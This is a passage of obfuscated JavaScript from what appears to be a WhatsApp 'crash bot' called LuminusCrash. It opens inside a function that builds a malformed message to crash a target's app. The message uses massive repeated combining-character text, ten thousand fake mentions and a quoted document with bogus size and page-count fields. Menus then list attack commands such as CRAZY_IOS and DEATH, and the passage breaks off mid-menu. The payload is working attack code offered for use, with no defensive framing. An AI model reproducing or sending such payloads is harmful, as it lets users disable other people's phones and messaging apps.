                'text': "\0" + "C҈R҈A҈Z҈Y҈_C҈R҈A҈S҈H҈⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(0x3c)
              },
              'nativeFlowMessage': {
                'messageParamsJson': '{}'
              },
              'contextInfo': {
                'mentionedJid': ["243890432038@s.whatsapp.net", ...Array.from({
                  'length': 0x2710
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net")],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'fromMe': false,
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'quotedMessage': {
                  'documentMessage': {
                    'url': "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    'fileLength': "9999999999999",
                    'pageCount': 0x4e729fff,
                    'mediaKey': "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    'fileName': "\0",
                    'fileEncSha256': "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    'directPath': "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    'mediaKeyTimestamp': "1724474503",
                    'contactVcard': true,
                    'thumbnailDirectPath': "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    'thumbnailSha256': "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    'thumbnailEncSha256': "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    'jpegThumbnail': ''
                  }
                }
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x410b00
        }
      });
    }
    ;
    switch (_0x17f353) {
      case 'menu':
        {
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': "🦄",
              'key': _0x22c6f2.key
            }
          });
          let _0x46c344 = "T҉E҉C҉H҉ H҉I҉N҉U҉G҉E҉R҉A҉\n\n           💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠\n   ┍─━────────────━─━░\n> Ωᴘʀᴇ́ғɪxᴇ : [ " + _0x232cc0 + " ]\n> Ωᴛᴇᴍᴘs : " + _0x228092(Date.now()) + "\n> Ωʙᴏᴛ : " + global.namabot + "\n> Ωᴠᴇʀsɪᴏɴ : " + global.versibot + "\n> Ωᴏᴡɴᴇʀ : " + namaowner + "\n> Ωᴛɢ : " + global.linktele + "\n   ┕─━────────────━─━░\n\n>  𝐡𝐞𝐲 👋 𝐛𝐢𝐞𝐧𝐯𝐞𝐧𝐮𝐞 𝐚 𝐭𝐨𝐢 𝐯𝐨𝐢𝐜𝐢 𝐥𝐞𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐞𝐬 𝐟𝐚𝐢𝐭 𝐭𝐨𝐧 𝐜𝐡𝐨𝐢𝐱.\n\n┏──⛣𝐌𝐄𝐍𝐔⛣──━━\nΩ ᴀʟʟᴍᴇɴᴜ\n🦹\nΩ ᴏᴡɴᴇʀᴍᴇɴᴜ\n🦹\nΩ ʙᴜɢᴍᴇɴᴜ\n┗───────────────────";
          await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'image': {
              'url': "https://files.catbox.moe/giab52.jpeg"
            },
            'caption': _0x46c344,
            'contextInfo': {
              'mentionedJid': [_0x22c6f2.sender],
              'forwardedNewsletterMessageInfo': {
                'newsletterName': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️",
                'newsletterJid': "120363374529648281@newsletter"
              },
              'isForwarded': true,
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠",
                'mediaType': 0x1,
                'renderLargerThumbnail': false,
                'thumbnailUrl': "https://files.catbox.moe/giab52.jpeg",
                'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i"
              }
            }
          }, {
            'quoted': _0x2be559
          });
          await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'audio': {
              'url': "https://files.catbox.moe/puyl7e.mp3"
            },
            'mimetype': "audio/mp4",
            'ptt': true
          }, {
            'quoted': _0x2be559
          });
        }
        break;
      case "ownermenu":
        {
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '🧞',
              'key': _0x22c6f2.key
            }
          });
          const _0x10c4aa = "👋 " + _0x2fcd41 + "\n\n           👩‍💻𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏👩‍💻\n   ┍─━────────────━─━░\n> Ωᴘʀᴇ́ғɪxᴇ : [ " + _0x232cc0 + " ]\n> Ωᴛᴇᴍᴘs : " + _0x228092(Date.now()) + "\n> Ωʙᴏᴛ : " + global.namabot + "\n> Ωᴠᴇʀsɪᴏɴ : " + global.versibot + "\n> Ωᴏᴡɴᴇʀ : " + namaowner + "\n> Ωᴛɢ : " + global.linktele + "\n   ┕─━────────────━─━░\n\n\n┏──⛣ 𝑷𝑹𝑶𝑷𝑹𝑰𝑬́𝑻𝑨𝑰𝑹𝑬\nΩ ᴀᴅᴅᴘʀᴇᴍ\nΩ ᴀᴅᴅᴏᴡɴᴇʀ\nΩ ᴅᴇʟᴘʀᴇᴍ\nΩ ᴏᴡɴᴇʀ\nΩ sᴇʟғ\nΩ ᴘᴜʙʟɪᴄ\n┗───────────────────";
          await _0x4d73c7.sendMessage(_0x22c6f2.chat, {
            'image': {
              'url': "https://files.catbox.moe/giab52.jpeg"
            },
            'caption': _0x10c4aa,
            'contextInfo': {
              'mentionedJid': [_0x22c6f2.sender],
              'forwardedNewsletterMessageInfo': {
                'newsletterName': "ʟɪᴍᴜʟᴇ{ʰⁱⁿᵘᵍᵉʳᵃ}✔️",
                'newsletterJid': "120363374529648281@newsletter"
              },
              'isForwarded': true,
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "💠ʟᴜᴍɪɴᴜsCʀᴀsʜ💠",
                'mediaType': 0x3,
                'renderLargerThumbnail': false,
                'thumbnailUrl': "https://files.catbox.moe/giab52.jpeg",
                'sourceUrl': "https://whatsapp.com/channel/0029VajBry5FnSzAqZxMhi1i"
              }
            }
          }, {
            'quoted': _0x2be559
          });
        }
        break;
      case "bugmenu":
        {
          await _0x4d73c7.sendMessage(_0x42cee0, {
            'react': {
              'text': '🔥',
              'key': _0x22c6f2.key
            }
          });
          const _0x31244e = "👋 " + _0x2fcd41 + "\n\n           👩‍💻𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒕𝒊𝒐𝒏👩‍💻\n   ┍─━────────────━─━░\n> Ωᴘʀᴇ́ғɪxᴇ : [ " + _0x232cc0 + " ]\n> Ωᴛᴇᴍᴘs : " + _0x228092(Date.now()) + "\n> Ωʙᴏᴛ : " + global.namabot + "\n> Ωᴠᴇʀsɪᴏɴ : " + global.versibot + "\n> Ωᴏᴡɴᴇʀ : " + namaowner + "\n> Ωᴛɢ : " + global.linktele + "\n   ┕─━────────────━─━░\n   \n⚠️ᴡᴀʀɴ : 𝗡𝗲 𝗽𝗮𝘀 𝗮𝗯𝘂𝘀𝗲𝗿 𝗱𝗲 𝗰𝗲𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝗲𝘀.\n   \n┏──⛣ 𝑰𝑷𝑯𝑶𝑵𝑬 & 𝑨𝑵𝑫𝑹𝑶𝑰𝑫\nΩ 𝙲𝚁𝙰𝚉𝚈_𝙸𝙾𝚂\nΩ 𝙲𝚁𝙰𝚉𝚈_𝙰𝙳𝚁𝙾\nΩ 𝙹𝚄𝙸𝙲𝙴_𝙸𝙾𝚂\n┗───────────────────\n\n┏──⛣ 𝐃𝐄𝐀𝐓𝐇 𝐁𝐔𝐆\nΩ 𝙳𝙴𝙰𝚃𝙷\nΩ 𝙳𝙴𝙰𝚃𝙷2\nΩ 𝙳𝙴𝙰𝚃𝙷3\nΩ 𝙳𝙴𝙰𝚃𝙷4\n┗───────────────────\n\n┏──⛣ 𝐎𝐓𝐇𝐄𝐑 𝐁𝐔𝐆\nΩ 